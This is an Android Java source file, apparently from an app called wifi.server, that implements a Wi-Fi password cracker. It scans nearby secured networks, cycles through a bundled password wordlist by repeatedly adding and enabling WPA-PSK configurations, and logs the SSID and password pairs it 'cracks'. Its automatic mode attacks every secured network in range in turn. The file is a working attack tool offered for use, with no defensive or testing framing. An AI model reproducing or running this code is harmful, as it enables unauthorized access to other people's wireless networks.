package com.jhj.dev.wifi.server.fragment;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.Fragment;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import com.jhj.dev.wifi.server.R;
import com.jhj.dev.wifi.server.material.ButtonFlat;
import com.jhj.dev.wifi.server.material.CheckBox;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

/**
 * @author 韩吉
 */
@SuppressLint("InflateParams")
public class BreakWifiFragment extends Fragment {

    public static Timer timer;
    TextView breakwificontent;
    ScrollView scrollView;
    ButtonFlat selectwifibt, startbreakwifibt, alreadyBreakbt;
    View breakwifiListView;
    ListView wifiListView;
    AlertDialog wifilistDialog;
    ProgressDialog myProgressDialog;
    boolean Btraking = false, isautomatic = false, isthread = true;
    Handler handler;
    WifiInfo wifiInfo;
    WifiConfiguration wifiConfiguration;
    WifiManager wifiManager;
    int i = 0, j = 0;
    int netID, beforeId;
    String[] password;
    BreakWifiReceiver bReceiver;
    String wifiName;
    Message message;
    List<Map<String, String>> breaksuccesslist = new ArrayList<>();

    ArrayList<String> wifilistStrings = new ArrayList<>();

    Thread thread;

    CheckBox checkBox;

    int position = -1; // 选择wifi列表点击的第几项

    /**
     * 破解的时间间隔（ 毫秒）
     */
    int BreakTime = 1500;

    /**
     * 准备破解的时间间隔（ 毫秒）
     */
    int PrepareBreakTime = 2000;

    View view;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);

        setHasOptionsMenu(true);
        regeistbroadcast(); // 注册广播
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState)
    {
        // TODO Auto-generated method stub

        view = inflater.inflate(R.layout.activity_break_wifi, container, false);

        Init();

        InitHandler();

        Setlistener();

        return view;
    }

    /**
     * handler 的初始化
     */
    @SuppressLint("HandlerLeak")
    private void InitHandler() {
        // TODO Auto-generated method stub

        handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                // TODO Auto-generated method stub
                super.handleMessage(msg);
                if (msg.what == 2) {

                    if (!isautomatic) {

                        breakwificontent.append("尝试密码结束" + "\n");
                        myProgressDialog.cancel();
                        createDialog("很抱歉，密码破解失败<-.->");
                        Btraking = false;
                        connectWifi();
                        startbreakwifibt.setEnabled(true);

                    } else {

                        j++;

                        PrepareBreakTime = 0;

                        breakwificontent.append("尝试密码结束" + "\n");
                        myProgressDialog.cancel();

                        startbreakwifibtEvent();

                    }

                } else if (msg.what == 3) {

                    myProgressDialog.setProgress((int) ((100.0 / password.length) * (i + 1)));
                }
            }
        };
    }

    /**
     * 监听函数
     */
    private void Setlistener() {
        // TODO Auto-generated method stub

        selectwifibt.setOnClickListener(new OnClickListener() { // com.ccit.dev.wifis 选择事件响应

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub

                wifiManager.startScan();
                wifilistStrings = wifiToarrayList(wifiManager.getScanResults());

                creatListDialog(wifilistStrings);

            }
        });

        startbreakwifibt.setOnClickListener(new OnClickListener() { // wifi破解按钮

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub

                if (isConnected()) { // 若已链接WiFi则断开wifi

                    disconnectWifi();
                }

                System.out.println(isautomatic);

                if (!isautomatic) {

                    InitThread();

                    startbreakwifibtEvent();
                } else {
                    InitThread();

                    breaksuccesslist.clear(); // 清楚之前的数据
                    wifiManager.startScan();

                    wifilistStrings = wifiToarrayList(wifiManager.getScanResults());

                    startbreakwifibtEvent();
                }
            }
        });

        checkBox.setOncheckListener(new CheckBox.OnCheckListener() {

            @Override
            public void onCheck(boolean check) {
                // TODO Auto-generated method stub
                isautomatic = check;

                selectwifibt.setEnabled(!check);
            }
        });

        alreadyBreakbt.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                if (breaksuccesslist.size() != 0) {
                    createDialog(breaksuccesslistToString(breaksuccesslist));
                } else {
                    Toast.makeText(getActivity(), "还未进行自动破解", Toast.LENGTH_SHORT).show();
                }
            }
        });

    }

    private String breaksuccesslistToString(List<Map<String, String>> list) {

        String listString = "";

        for (Map<String, String> map : list) {
            listString = listString + "SSID    :" + nameToString(map.get("ssid")) + "\nPassword:" +
                         map.get("password") + "\n";
        }

        return listString;
    }

    /**
     * 初始化线程，该线程用于文本自动追踪到底部
     */
    private void InitThread() {

        isthread = true;

        thread = new Thread(new Runnable() { // textview自动追踪到底部

            @SuppressWarnings("static-access")
            @Override
            public void run() {
                // TODO Auto-generated method stub
                while (isthread) {
                    if (scrollView == null || breakwificontent == null) {
                        return;
                    }
                    // 内层高度超过外层
                    int offset =
                            breakwificontent.getMeasuredHeight() - scrollView.getMeasuredHeight();
                    if (offset < 0) {

                        offset = 0;
                    }
                    scrollView.scrollTo(0, offset);

                    try {
                        thread.sleep(BreakTime);
                    } catch (Exception e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            }
        });

        thread.start();
    }

    /**
     * 开始破解的点击事件内容
     */
    private void startbreakwifibtEvent() {

        if (!isautomatic) {
            if (position != -1) {
                wifiName = nameToString(wifilistStrings.get(position));
            } else {
                wifiName = "请选择wifi信号";
            }
        } else {
            try {
                wifiName = nameToString(wifilistStrings.get(j));
            } catch (Exception e) {
                // TODO Auto-generated catch block

                wifiName = "请选择wifi信号";
            }
        }

        if (!wifiName.equals("请选择wifi信号")) {

            if (!wifiManager.isWifiEnabled()) {
                wifiManager.setWifiEnabled(true);
            }

            if (!isautomatic) {
                startbreakwifibt.setEnabled(false);
            }

            i = 0;
            timer = new Timer();
            Log.d("Mylog", "开始破解----------------->" + wifiName);
            breakwificontent.append("开始破解----------------->" + wifiName + "\n");

            creatProgressDialog();

            timer.schedule(new TimerTask() {

                @Override
                public void run() {
                    // TODO Auto-generated method stub
                    BreakingCode(wifiName);

                    if (!Btraking) {
                        Btraking = true;
                    }
                }
            }, PrepareBreakTime, BreakTime);
        } else if (!isautomatic) {
            Toast.makeText(getActivity(), "请先选择信号", Toast.LENGTH_SHORT).show();
        } else {

            j = 0;
            PrepareBreakTime = 2000;
            createDialog("自动破解循环结束");

            connectWifi();
        }
    }

    /**
     * 断开当前WiFi连接
     */
    public void disconnectWifi() {

        wifiInfo = wifiManager.getConnectionInfo();
        beforeId = wifiInfo.getNetworkId();
        wifiManager.disableNetwork(beforeId);
    }

    /**
     * 链接wifi
     */
    private void connectWifi() {

        if (beforeId != 0) {
            wifiManager.enableNetwork(beforeId, true);
        }
    }

    /**
     * 判断wifi连接状态
     *
     * @return
     */
    private boolean isConnected() {

        ConnectivityManager connManager =
                (ConnectivityManager) getActivity().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        return mWifi.isConnected();

    }

    /**
     * @param name
     * @return 截取wifi名称的ssid
     */
    private String nameToString(String name) {

        String[] namesStrings = name.split("（");
        return namesStrings[0];
    }

    /**
     * @param wifiname wifi链接破解
     */
    public void BreakingCode(String wifiname) {

        if (netID != 0) {
            wifiManager.removeNetwork(netID);
        }

        Log.d("Mylog", "尝试密码：------>" + password[i]);

        message = new Message();
        message.what = 3;
        handler.sendMessage(message);

        wifiConfiguration = new WifiConfiguration();
        wifiConfiguration.SSID = "\"" + wifiname + "\""; // 指定ssid
        wifiConfiguration.preSharedKey = "\"" + password[i] + "\""; // 指定密码
        wifiConfiguration.hiddenSSID = true;
        wifiConfiguration.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
        wifiConfiguration.status = WifiConfiguration.Status.ENABLED;
        netID = wifiManager.addNetwork(wifiConfiguration);
        wifiManager.enableNetwork(netID, true);
        if (i == password.length - 1) {

            message = new Message();
            message.what = 2;
            handler.sendMessage(message);

            timer.cancel();
        }
        i++;
    }

    /**
     * @param list 创建dialog弹出框
     */
    private void creatListDialog(ArrayList<String> list) {

        breakwifiListView =
                getActivity().getLayoutInflater().inflate(R.layout.layout_listview, null);

        wifiListView = (ListView) breakwifiListView.findViewById(R.id.myListview);

        ArrayAdapter<String> adapter =
                new ArrayAdapter<>(getActivity(), android.R.layout.simple_list_item_1, list);
        wifiListView.setAdapter(adapter);

        wifilistDialog = new AlertDialog.Builder(getActivity()).setTitle("请选择需要破解的WiFi")
                                                               .setView(breakwifiListView)
                                                               .setNegativeButton("取消",
                                                                                  new DialogInterface.OnClickListener() {

                                                                                      @Override
                                                                                      public void onClick(
                                                                                              DialogInterface dialog,
                                                                                              int which)
                                                                                      {
                                                                                          // TODO Auto-generated method stub

                                                                                          selectwifibt
                                                                                                  .setText(
                                                                                                          "请选择wifi信号");

                                                                                          position =
                                                                                                  -1;
                                                                                          connectWifi();
                                                                                      }
                                                                                  }).create();
        wifilistDialog.show();

        listviewListener();

    }

    /**
     * @param message 创建dialog弹出框
     */
    private void createDialog(String message) {

        new AlertDialog.Builder(getActivity()).setMessage(message).setPositiveButton("确定", null)
                                              .create().show();

        isthread = false;
    }

    /**
     * 创建 进度条对话框
     */
    private void creatProgressDialog() {
        myProgressDialog = new ProgressDialog(getActivity());
        // 实例化
        myProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        // 设置进度条风格，风格为长形，有刻度的
        myProgressDialog.setMessage("正在破解:" + wifiName);
        // 设置ProgressDialog 提示信息

        myProgressDialog.setMax(100);

        myProgressDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "取消",
                                   new DialogInterface.OnClickListener() {
                                       @Override
                                       public void onClick(DialogInterface dialog, int which) {
                                           // TODO Auto-generated method stub

                                           PrepareBreakTime = 2000;

                                           Btraking = false;
                                           myProgressDialog.cancel();
                                           timer.cancel();
                                           i = 0;
                                           startbreakwifibt.setEnabled(true);

                                           if (isautomatic) {
                                               j = 0;
                                           }

                                           isthread = false;

                                           connectWifi();
                                       }
                                   });

        myProgressDialog.setIndeterminate(false);
        // 设置ProgressDialog 的进度条是否不明确
        myProgressDialog.setCancelable(false);
        // 设置ProgressDialog 是否可以按退回按键取消
        myProgressDialog.show();
        // 让ProgressDialog显示
    }

    /**
     * 弹出框listview的事件响应
     */
    private void listviewListener() {
        wifiListView.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                // TODO Auto-generated method stub
                Log.d("Mylog", wifilistStrings.get(position));

                selectwifibt.setText(wifilistStrings.get(position));
                BreakWifiFragment.this.position = position;
                wifilistDialog.cancel();
            }
        });
    }

    /**
     * @param list
     * @return 将wifi扫描到的list集合转换成字符串集合
     */
    private ArrayList<String> wifiToarrayList(List<ScanResult> list) {

        ArrayList<String> wifilist = new ArrayList<>();

        for (ScanResult scanResult : list) {
            if (scanResult.capabilities.length() > 10) { // 去除开放的ssid，开放的加密方式字符长度小于10
                wifilist.add(scanResult.SSID + "（" + scanResult.BSSID + "）");
            }
        }

        return wifilist;
    }

    /**
     * 初始化变量
     */

    private void Init() {
        // TODO Auto-generated method stub

        breakwificontent = (TextView) view.findViewById(R.id.breakwificontent);
        selectwifibt = (ButtonFlat) view.findViewById(R.id.selectwifi);
        startbreakwifibt = (ButtonFlat) view.findViewById(R.id.startbreakwifi);

        alreadyBreakbt = (ButtonFlat) view.findViewById(R.id.breakwifilist);

        scrollView = (ScrollView) view.findViewById(R.id.scrollView1);

        wifiManager = (WifiManager) getActivity().getSystemService(Context.WIFI_SERVICE);

        password = getActivity().getResources().getStringArray(R.array.passwords);

        checkBox = (CheckBox) view.findViewById(R.id.checkBox1);

    }

    /**
     * 注册广播
     */
    private void regeistbroadcast() {
        // TODO Auto-generated method stub
        IntentFilter iFilter = new IntentFilter();
        iFilter.addAction("android.net.com.ccit.dev.wifis.STATE_CHANGE");
        iFilter.setPriority(999);
        bReceiver = new BreakWifiReceiver();
        getActivity().registerReceiver(bReceiver, iFilter);
    }

    @Override
    public void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
        getActivity().unregisterReceiver(bReceiver);

        connectWifi();
    }

    @Override
    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater)
    {
        inflater.inflate(R.menu.break_wifi, menu);
        // TODO Auto-generated method stub

    }

    /**
     * @author Administrator wifi破解广播
     */
    public class BreakWifiReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            // TODO Auto-generated method stub

            if (intent.getAction().equals("android.net.com.ccit.dev.wifis.STATE_CHANGE") &&
                Btraking)
            {
                Log.d("Mylog", "-----" + intent.toString());
                Btraking = false;
                timer.cancel();
                breakwificontent.append("破解成功:密码为" + password[i - 1] + "\n");
                myProgressDialog.cancel();
                startbreakwifibt.setEnabled(true);

                if (!isautomatic) {

                    createDialog("破解成功:密码为" + password[i - 1]);
                } else {

                    Map<String, String> map = new HashMap<>();
                    map.put("ssid", wifilistStrings.get(j));
                    map.put("password", password[i - 1]);

                    PrepareBreakTime = 1000; // 破解成功 停留1秒

                    breaksuccesslist.add(map); // 存储破解成功的密码
                    j++;

                    startbreakwifibtEvent();
                }
            }
        }
    }


}
